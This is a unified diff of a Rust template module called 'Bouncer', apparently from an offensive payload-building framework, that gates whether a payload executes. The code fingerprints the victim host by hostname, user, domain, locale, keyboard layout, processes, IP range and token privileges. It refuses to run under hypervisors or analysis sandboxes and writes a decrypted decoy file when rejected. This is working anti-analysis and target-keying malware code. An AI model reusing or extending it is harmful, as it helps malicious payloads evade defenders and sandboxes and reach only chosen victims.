@@ -1,33 +1,47 @@
 // --- Bouncer (technique fragment) ---
 
-use windows::core::PWSTR;
-use windows::Win32::Foundation::{CloseHandle, GetLastError, HMODULE};
+use windows::core::{PCWSTR, PWSTR};
+use windows::Win32::Foundation::{
+    BOOL, CloseHandle, ERROR_BUFFER_OVERFLOW, ERROR_NO_DATA, GetLastError, HANDLE, HMODULE, LUID,
+};
 use windows::Win32::Globalization::GetUserDefaultLocaleName;
+use windows::Win32::NetworkManagement::IpHelper::{
+    GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_MULTICAST, GetAdaptersAddresses,
+    IP_ADAPTER_ADDRESSES_LH,
+};
+use windows::Win32::NetworkManagement::Ndis::IfOperStatusUp;
+use windows::Win32::Networking::WinSock::{
+    AF_INET, AF_INET6, AF_UNSPEC, SOCKADDR_IN, SOCKADDR_IN6,
+};
+use windows::Win32::Security::{
+    GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, LookupPrivilegeValueW,
+    PrivilegeCheck, SE_PRIVILEGE_ENABLED, TOKEN_ELEVATION, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
+    TokenElevation, TokenIntegrityLevel, LUID_AND_ATTRIBUTES, PRIVILEGE_SET,
+};
 use windows::Win32::System::Diagnostics::ToolHelp::{
-    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
 };
 use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
 use windows::Win32::System::SystemInformation::{
     ComputerNameDnsDomain, GetComputerNameExW, GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx,
     MEMORYSTATUSEX, SYSTEM_INFO,
 };
+use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
 use windows::Win32::System::WindowsProgramming::{GetComputerNameW, GetUserNameW};
 use windows::Win32::UI::Input::KeyboardAndMouse::{
     GetKeyboardLayout, GetKeyboardLayoutList, GetKeyboardLayoutNameW, HKL,
 };
 
-/// Whether every declared check must pass (`true`) or at least one (`false`).
-const MODE_ALL: bool = $MODE_ALL$;
-/// Whether a rejected host exits with code 1 (`true`) or silently (`false`).
-const ON_FAIL_EXIT: bool = $ON_FAIL_EXIT$;
-/// Whether a rejected host writes the configured decoy before exiting.
-const ON_FAIL_DECOY: bool = $ON_FAIL_DECOY$;
-/// Whether the decoy drop exits with code 1 (`true`) or silently (`false`).
-const AFTER_EXIT: bool = $AFTER_EXIT$;
 /// Whether the host must not be a hypervisor guest.
-const REQUIRE_NOT_VM: bool = $REQUIRE_NOT_VM$;
+const REQUIRE_NOT_HYPERVISOR: bool = $REQUIRE_HYPERVISOR$;
 /// Whether the host must not look like an analysis environment.
-const REQUIRE_NOT_ANALYSIS_ENV: bool = $REQUIRE_NOT_ANALYSIS_ENV$;
+const REQUIRE_NOT_SANDBOX: bool = $REQUIRE_SANDBOX$;
+/// Whether a rejected host writes the configured decoy.
+const ON_REJECT_DECOY: bool = $ON_REJECT_DECOY$;
+/// Whether the rejection path exits the process (instead of returning `false`).
+const ON_REJECT_EXIT: bool = $ON_REJECT_EXIT$;
+/// Exit code used by the rejection path when `ON_REJECT_EXIT` is set.
+const EXIT_CODE: i32 = $EXIT_CODE$;
 
 /// Number of environment indicators that must coincide before the aggregate
 /// heuristic reports a sandbox-like host. Deliberately conservative (3): a
@@ -42,161 +56,47 @@ const ENV_MIN_RAM_MB: u64 = 2048;
 /// Uptime (minutes) below which a host looks like a sandbox.
 const ENV_MIN_UPTIME_MIN: u64 = 10;
 
-/// Gate entry point: evaluates the declared checks and returns `false` when the
-/// pipeline must abort (so the payload is not run).
+/// Gate entry point: evaluates the declared requirements and returns `false`
+/// when the pipeline must abort (so the payload is not run).
 ///
-/// With no declared check this is a no-op and returns `true`. When
-/// `ON_FAIL_EXIT` is set, a rejection exits the process with code 1 instead of
-/// letting the template exit silently.
+/// With no requirement declared this is a no-op and returns `true`. The
+/// `anti_analysis` checks are hard vetoes: they apply even when `any_of` has a
+/// passing entry.
 pub fn bouncer() -> Result<bool, String> {
-    // Declared checks. Each is `None`/empty when the YAML did not set it.
-    let hostname_pattern: Option<String> = $HOSTNAME_DEF$;
-    let username_pattern: Option<String> = $USERNAME_DEF$;
-    let domain_pattern: Option<String> = $DOMAIN_DEF$;
-    let languages: Vec<String> = $LANGUAGE_DEF$;
-    let keyboards: Vec<String> = $KEYBOARD_DEF$;
-    let env_processes: Vec<String> = $ANALYSIS_PROCESSES_DEF$;
-    let env_tokens: Vec<String> = $ANALYSIS_PATH_TOKENS_DEF$;
-    let vendor_tokens: Vec<String> = $VENDOR_TOKENS_DEF$;
-    let processes: Vec<(String, bool)> = $PROCESS_DEFS$;
-    let min_uptime: Option<u32> = $MIN_UPTIME_DEF$;
-    let min_ram: Option<u32> = $MIN_RAM_DEF$;
+    let mut require_declared: u32 = 0;
+    let mut require_passed: u32 = 0;
+    let mut any_declared: u32 = 0;
+    let mut any_passed: u32 = 0;
 
-    let mut declared: u32 = 0;
-    let mut passed: u32 = 0;
+$REQUIRE_BLOCKS$
+$ANY_OF_BLOCKS$
 
-    if let Some(pattern) = hostname_pattern.as_ref() {
-        declared += 1;
-        let actual = computer_name()?;
-        let ok = glob_match(pattern, &actual);
-        crate::tech_dbg!("bouncer", "hostname '{actual}' ~ '{pattern}' -> {ok}");
-        if ok {
-            passed += 1;
-        }
+    let mut accepted = require_declared == 0 || require_passed == require_declared;
+    if any_declared > 0 {
+        accepted = accepted && any_passed > 0;
     }
 
-    if let Some(pattern) = username_pattern.as_ref() {
-        declared += 1;
-        let actual = user_name()?;
-        let ok = glob_match(pattern, &actual);
-        crate::tech_dbg!("bouncer", "username '{actual}' ~ '{pattern}' -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    if let Some(pattern) = domain_pattern.as_ref() {
-        declared += 1;
-        let actual = dns_domain()?;
-        let ok = glob_match(pattern, &actual);
-        crate::tech_dbg!("bouncer", "domain '{actual}' ~ '{pattern}' -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    if !languages.is_empty() {
-        declared += 1;
-        let locale = locale_name()?;
-        let ok = languages
-            .iter()
-            .any(|accepted| accepted.eq_ignore_ascii_case(&locale));
-        crate::tech_dbg!("bouncer", "language '{locale}' in {languages:?} -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    if !keyboards.is_empty() {
-        declared += 1;
-        let active = keyboard_layouts()?;
-        let ok = active.iter().any(|layout| {
-            keyboards
-                .iter()
-                .any(|accepted| normalize_klid(accepted) == *layout)
-        });
-        crate::tech_dbg!("bouncer", "keyboard {active:?} in {keyboards:?} -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    // The `processes` list is one check: it passes only when every entry holds.
-    // A `(name, true)` entry requires the process to be running; `(name, false)`
-    // requires it to be absent.
-    if !processes.is_empty() {
-        declared += 1;
-        let running = running_processes()?;
-        let ok = processes.iter().all(|(pattern, require_present)| {
-            let present = running.iter().any(|name| {
-                let stem = match name.strip_suffix(".exe") {
-                    Some(stem) => stem,
-                    None => name.as_str(),
-                };
-                glob_match(pattern, name) || glob_match(pattern, stem)
-            });
-            present == *require_present
-        });
-        crate::tech_dbg!("bouncer", "processes {} -> {ok}", processes.len());
-        if ok {
-            passed += 1;
-        }
-    }
-
-    if REQUIRE_NOT_VM {
-        declared += 1;
+    if REQUIRE_NOT_HYPERVISOR {
+        let vendor_tokens: Vec<String> = $VENDOR_TOKENS$;
         let present = hypervisor_vendor_present(&vendor_tokens);
-        let ok = !present;
-        crate::tech_dbg!("bouncer", "hypervisor present: {present} -> {ok}");
-        if ok {
-            passed += 1;
-        }
+        crate::tech_dbg!("bouncer", "hypervisor present: {present}");
+        accepted = accepted && !present;
     }
 
-    if REQUIRE_NOT_ANALYSIS_ENV {
-        declared += 1;
+    if REQUIRE_NOT_SANDBOX {
+        let env_processes: Vec<String> = $ANALYSIS_PROCESSES$;
+        let env_tokens: Vec<String> = $ANALYSIS_PATH_TOKENS$;
         let score = env_score(&env_processes, &env_tokens)?;
-        let ok = score < ENV_SCORE_THRESHOLD;
         crate::tech_dbg!(
             "bouncer",
-            "environment score {score} (limit {ENV_SCORE_THRESHOLD}) -> {ok}"
+            "environment score {score} (limit {ENV_SCORE_THRESHOLD})"
         );
-        if ok {
-            passed += 1;
-        }
+        accepted = accepted && score < ENV_SCORE_THRESHOLD;
     }
 
-    if let Some(minimum) = min_uptime {
-        declared += 1;
-        let uptime = uptime_minutes();
-        let ok = uptime >= minimum as u64;
-        crate::tech_dbg!("bouncer", "uptime {uptime} min (min {minimum}) -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    if let Some(minimum) = min_ram {
-        declared += 1;
-        let ram = total_ram_mb()?;
-        let ok = ram >= minimum as u64;
-        crate::tech_dbg!("bouncer", "ram {ram} MiB (min {minimum}) -> {ok}");
-        if ok {
-            passed += 1;
-        }
-    }
-
-    let accepted = if declared == 0 {
-        // No check declared: the gate cannot reject the host.
-        true
-    } else if MODE_ALL {
-        passed == declared
-    } else {
-        passed > 0
-    };
     crate::tech_dbg!(
         "bouncer",
-        "{passed}/{declared} check(s) passed (mode all: {MODE_ALL})"
+        "require {require_passed}/{require_declared}, any {any_passed}/{any_declared}"
     );
 
     if accepted {
@@ -205,18 +105,13 @@ pub fn bouncer() -> Result<bool, String> {
     }
     crate::tech_dbg!("bouncer", "host rejected");
 
-    // Rejected. `decoy` writes the embedded asset first; `exit` leaves an
-    // explicit signal; `silent` lets the template exit with code 0 and no reason
-    // behind it.
-    if ON_FAIL_DECOY {
+    // Rejected. The decoy (if configured) is written first; then `exit` leaves
+    // an explicit signal and `abort` lets the runner exit with code 0.
+    if ON_REJECT_DECOY {
         drop_decoy()?;
-        if AFTER_EXIT {
-            std::process::exit(1);
-        }
-        return Ok(false);
     }
-    if ON_FAIL_EXIT {
-        std::process::exit(1);
+    if ON_REJECT_EXIT {
+        std::process::exit(EXIT_CODE);
     }
     Ok(false)
 }
@@ -277,6 +172,11 @@ fn wide_to_string(buffer: &[u16]) -> String {
     String::from_utf16_lossy(&buffer[..length])
 }
 
+/// Encodes a string as a NUL-terminated UTF-16 buffer for the `*W` APIs.
+fn to_wide(value: &str) -> Vec<u16> {
+    value.encode_utf16().chain(core::iter::once(0)).collect()
+}
+
 /// Reads the computer name (`GetComputerNameW`).
 fn computer_name() -> Result<String, String> {
     let mut buffer = [0u16; 256];
@@ -287,7 +187,10 @@ fn computer_name() -> Result<String, String> {
             crate::tech_dbg!("bouncer", "hostname '{name}'");
             Ok(name)
         }
-        Err(error) => Err(win32_error($MSG_COMPUTER_NAME_FAILED$, error.code().0 as u32)),
+        Err(error) => Err(win32_error(
+            $MSG_COMPUTER_NAME_FAILED$,
+            error.code().0 as u32,
+        )),
     }
 }
 
@@ -307,13 +210,14 @@ fn user_name() -> Result<String, String> {
 
 /// Reads the DNS domain name (`GetComputerNameExW(ComputerNameDnsDomain)`).
 ///
-/// A host outside a domain yields an empty string, so a `domain` check then
-/// simply fails instead of erroring.
+/// A host outside a domain yields an empty string, so a `domain` requirement
+/// then simply fails instead of erroring.
 fn dns_domain() -> Result<String, String> {
     let mut buffer = [0u16; 256];
     let mut size = buffer.len() as u32;
-    match unsafe { GetComputerNameExW(ComputerNameDnsDomain, PWSTR(buffer.as_mut_ptr()), &mut size) }
-    {
+    match unsafe {
+        GetComputerNameExW(ComputerNameDnsDomain, PWSTR(buffer.as_mut_ptr()), &mut size)
+    } {
         Ok(()) => Ok(wide_to_string(&buffer)),
         Err(error) => Err(win32_error($MSG_DOMAIN_FAILED$, error.code().0 as u32)),
     }
@@ -326,7 +230,9 @@ fn locale_name() -> Result<String, String> {
     let mut buffer = [0u16; 85];
     let written = unsafe { GetUserDefaultLocaleName(&mut buffer) };
     if written <= 0 {
-        return Err(win32_error($MSG_LOCALE_FAILED$, unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_LOCALE_FAILED$, unsafe {
+            GetLastError().0
+        }));
     }
     let locale = wide_to_string(&buffer);
     crate::tech_dbg!("bouncer", "locale '{locale}'");
@@ -354,12 +260,16 @@ fn keyboard_layouts() -> Result<Vec<String>, String> {
 
     let count = unsafe { GetKeyboardLayoutList(None) };
     if count <= 0 {
-        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe {
+            GetLastError().0
+        }));
     }
     let mut list = vec![HKL(std::ptr::null_mut()); count as usize];
     let filled = unsafe { GetKeyboardLayoutList(Some(&mut list)) };
     if filled <= 0 {
-        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe { GetLastError().0 }));
+        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe {
+            GetLastError().0
+        }));
     }
     for hkl in list.iter().take(filled as usize) {
         layouts.push(format!("{:04X}", hkl.0 as usize as u16));
@@ -371,16 +281,21 @@ fn keyboard_layouts() -> Result<Vec<String>, String> {
 }
 
 /// Normalizes a keyboard layout id to an uppercase 4-digit hex code: strips an
-/// optional `0x` prefix and keeps the last four digits of the KLID string.
+/// optional `0x` prefix and keeps the last four characters of the KLID string.
+///
+/// Works on characters, not bytes: a non-ASCII value must not panic on a byte
+/// index that falls inside a multi-byte character.
 fn normalize_klid(value: &str) -> String {
     let mut text = value.trim().to_ascii_uppercase();
     if let Some(stripped) = text.strip_prefix("0X") {
         text = stripped.to_string();
     }
-    if text.len() > 4 {
-        text = text[text.len() - 4..].to_string();
+    let chars: Vec<char> = text.chars().collect();
+    if chars.len() > 4 {
+        chars[chars.len() - 4..].iter().copied().collect()
+    } else {
+        text
     }
-    text
 }
 
 /// The architecture's `core::arch` module: the CPUID intrinsic moved between
@@ -454,11 +369,20 @@ fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, String> {
     Ok(score)
 }
 
-/// Whether any process in `names` is running, compared by executable stem.
+/// Whether any process in `names` is running.
+///
+/// Both the file name and its `.exe`-stripped stem are compared, so the
+/// built-in list (which carries the `.exe` suffix) matches the snapshot's
+/// `szExeFile` and a user entry without the suffix matches too.
 fn env_process_running(names: &[String]) -> Result<bool, String> {
     let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
         Ok(handle) => handle,
-        Err(error) => return Err(win32_error($MSG_PROCESS_ENUM_FAILED$, error.code().0 as u32)),
+        Err(error) => {
+            return Err(win32_error(
+                $MSG_PROCESS_ENUM_FAILED$,
+                error.code().0 as u32,
+            ));
+        }
     };
 
     let mut entry = PROCESSENTRY32W {
@@ -474,10 +398,15 @@ fn env_process_running(names: &[String]) -> Result<bool, String> {
                 Some(stem) => stem,
                 None => name.as_str(),
             };
-            if names
-                .iter()
-                .any(|candidate| stem.eq_ignore_ascii_case(candidate))
-            {
+            let matched = names.iter().any(|candidate| {
+                let candidate = candidate.to_ascii_lowercase();
+                let candidate_stem = match candidate.strip_suffix(".exe") {
+                    Some(value) => value,
+                    None => candidate.as_str(),
+                };
+                name == candidate || stem == candidate_stem
+            });
+            if matched {
                 found = true;
                 break;
             }
@@ -527,7 +456,10 @@ fn total_ram_mb() -> Result<u64, String> {
     };
     match unsafe { GlobalMemoryStatusEx(&mut status) } {
         Ok(()) => Ok(status.ullTotalPhys / 1024 / 1024),
-        Err(error) => Err(win32_error($MSG_MEMORY_QUERY_FAILED$, error.code().0 as u32)),
+        Err(error) => Err(win32_error(
+            $MSG_MEMORY_QUERY_FAILED$,
+            error.code().0 as u32,
+        )),
     }
 }
 
@@ -540,7 +472,12 @@ fn uptime_minutes() -> u64 {
 fn running_processes() -> Result<Vec<String>, String> {
     let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
         Ok(handle) => handle,
-        Err(error) => return Err(win32_error($MSG_PROCESS_ENUM_FAILED$, error.code().0 as u32)),
+        Err(error) => {
+            return Err(win32_error(
+                $MSG_PROCESS_ENUM_FAILED$,
+                error.code().0 as u32,
+            ));
+        }
     };
 
     let mut entry = PROCESSENTRY32W {
@@ -562,11 +499,201 @@ fn running_processes() -> Result<Vec<String>, String> {
     Ok(names)
 }
 
+/// IPv4 mask for `prefix`; `/0` is the all-zero mask.
+fn mask_v4(prefix: u8) -> u32 {
+    if prefix == 0 {
+        0
+    } else {
+        u32::MAX << (32 - prefix)
+    }
+}
+
+/// IPv6 mask for `prefix`; `/0` is the all-zero mask.
+fn mask_v6(prefix: u8) -> u128 {
+    if prefix == 0 {
+        0
+    } else {
+        u128::MAX << (128 - prefix)
+    }
+}
+
+/// Collects the unicast IPv4 and IPv6 addresses of every adapter that is up
+/// (`GetAdaptersAddresses`).
+///
+/// Addresses are returned in host byte order so the mask comparison is a plain
+/// integer operation. IPv4 addresses are widened to `u32`, IPv6 to `u128`.
+fn local_addresses() -> Result<(Vec<u32>, Vec<u128>), String> {
+    let flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
+    let family = AF_UNSPEC.0 as u32;
+
+    let mut size = 0u32;
+    let first = unsafe { GetAdaptersAddresses(family, flags, None, None, &mut size) };
+    if first == 0 || first == ERROR_NO_DATA.0 {
+        return Ok((Vec::new(), Vec::new()));
+    }
+    if first != ERROR_BUFFER_OVERFLOW.0 || size == 0 {
+        return Err(win32_error($MSG_IP_ENUM_FAILED$, first));
+    }
+
+    let mut words = vec![0u64; (size as usize + 7) / 8];
+    let mut head = words.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH;
+    let code = unsafe { GetAdaptersAddresses(family, flags, None, Some(head), &mut size) };
+    if code != 0 {
+        return Err(win32_error($MSG_IP_ENUM_FAILED$, code));
+    }
+
+    let mut v4 = Vec::new();
+    let mut v6 = Vec::new();
+    while !head.is_null() {
+        let adapter = unsafe { &*head };
+        if adapter.OperStatus == IfOperStatusUp {
+            let mut unicast = adapter.FirstUnicastAddress;
+            while !unicast.is_null() {
+                let entry = unsafe { &*unicast };
+                let sockaddr = entry.Address.lpSockaddr;
+                if !sockaddr.is_null() {
+                    let address_family = unsafe { (*sockaddr).sa_family };
+                    if address_family == AF_INET {
+                        let address = unsafe { &*(sockaddr as *const SOCKADDR_IN) };
+                        let raw = unsafe { address.sin_addr.S_un.S_addr };
+                        v4.push(u32::from_be_bytes(raw.to_ne_bytes()));
+                    } else if address_family == AF_INET6 {
+                        let address = unsafe { &*(sockaddr as *const SOCKADDR_IN6) };
+                        v6.push(u128::from_be_bytes(unsafe { address.sin6_addr.u.Byte }));
+                    }
+                }
+                unicast = entry.Next;
+            }
+        }
+        head = adapter.Next;
+    }
+
+    Ok((v4, v6))
+}
+
+/// Opens the current process token with `TOKEN_QUERY`.
+fn open_token() -> Result<HANDLE, String> {
+    let mut token = HANDLE::default();
+    match unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) } {
+        Ok(()) => Ok(token),
+        Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
+    }
+}
+
+/// Whether the current token is elevated (`TokenElevation`).
+fn token_is_elevated() -> Result<bool, String> {
+    let token = open_token()?;
+    let mut elevation = TOKEN_ELEVATION::default();
+    let mut returned = 0u32;
+    let result = match unsafe {
+        GetTokenInformation(
+            token,
+            TokenElevation,
+            Some(&mut elevation as *mut _ as *mut core::ffi::c_void),
+            core::mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut returned,
+        )
+    } {
+        Ok(()) => Ok(elevation.TokenIsElevated != 0),
+        Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
+    };
+    let _ = unsafe { CloseHandle(token) };
+    result
+}
+
+/// The integrity RID of the current token (`TokenIntegrityLevel`).
+///
+/// The token stores a mandatory-label SID; the level is the last sub-authority
+/// (`0x1000` low, `0x2000` medium, `0x3000` high, `0x4000` system).
+fn token_integrity() -> Result<u32, String> {
+    let token = open_token()?;
+    let mut needed = 0u32;
+    let _ = unsafe {
+        GetTokenInformation(
+            token,
+            TokenIntegrityLevel,
+            None,
+            0,
+            &mut needed,
+        )
+    };
+    let result = if needed == 0 {
+        Err(win32_error($MSG_TOKEN_FAILED$, unsafe { GetLastError().0 }))
+    } else {
+        let mut words = vec![0u64; (needed as usize + 7) / 8];
+        match unsafe {
+            GetTokenInformation(
+                token,
+                TokenIntegrityLevel,
+                Some(words.as_mut_ptr().cast()),
+                needed,
+                &mut needed,
+            )
+        } {
+            Ok(()) => {
+                let label = unsafe { &*(words.as_ptr() as *const TOKEN_MANDATORY_LABEL) };
+                if label.Label.Sid.0.is_null() {
+                    Err($MSG_TOKEN_FAILED$)
+                } else {
+                    let count = unsafe { *GetSidSubAuthorityCount(label.Label.Sid) };
+                    if count == 0 {
+                        Err($MSG_TOKEN_FAILED$)
+                    } else {
+                        Ok(unsafe {
+                            *GetSidSubAuthority(label.Label.Sid, (count - 1) as u32)
+                        })
+                    }
+                }
+            }
+            Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
+        }
+    };
+    let _ = unsafe { CloseHandle(token) };
+    result
+}
+
+/// Whether `name` is enabled in the current token.
+///
+/// `PrivilegeCheck` answers exactly that: the privilege exists *and* is enabled
+/// (an administrator's disabled `SeDebugPrivilege` does not pass).
+fn privilege_enabled(name: &str) -> Result<bool, String> {
+    let token = open_token()?;
+    let wide = to_wide(name);
+    let mut luid = LUID::default();
+    let result = match unsafe { LookupPrivilegeValueW(PCWSTR::null(), PCWSTR(wide.as_ptr()), &mut luid) }
+    {
+        Ok(()) => {
+            let mut set = PRIVILEGE_SET {
+                PrivilegeCount: 1,
+                Control: 0,
+                Privilege: [LUID_AND_ATTRIBUTES {
+                    Luid: luid,
+                    Attributes: SE_PRIVILEGE_ENABLED,
+                }],
+            };
+            let mut held = BOOL(0);
+            match unsafe { PrivilegeCheck(token, &mut set, &mut held) } {
+                Ok(()) => Ok(held.as_bool()),
+                Err(error) => Err(win32_error(
+                    $MSG_PRIVILEGE_FAILED$,
+                    error.code().0 as u32,
+                )),
+            }
+        }
+        Err(error) => Err(win32_error(
+            $MSG_PRIVILEGE_FAILED$,
+            error.code().0 as u32,
+        )),
+    };
+    let _ = unsafe { CloseHandle(token) };
+    result
+}
+
 /// Writes the configured decoy to disk (decrypting the embedded asset).
 ///
 /// A no-op when no path is declared, so the no-op gate never touches the disk.
 fn drop_decoy() -> Result<(), String> {
-    let path: Option<String> = $DECOY_PATH_DEF$;
+    let path: Option<String> = $DECOY_PATH$;
     let path = match path {
         Some(path) => crate::expand_env(&path),
         None => return Ok(()),
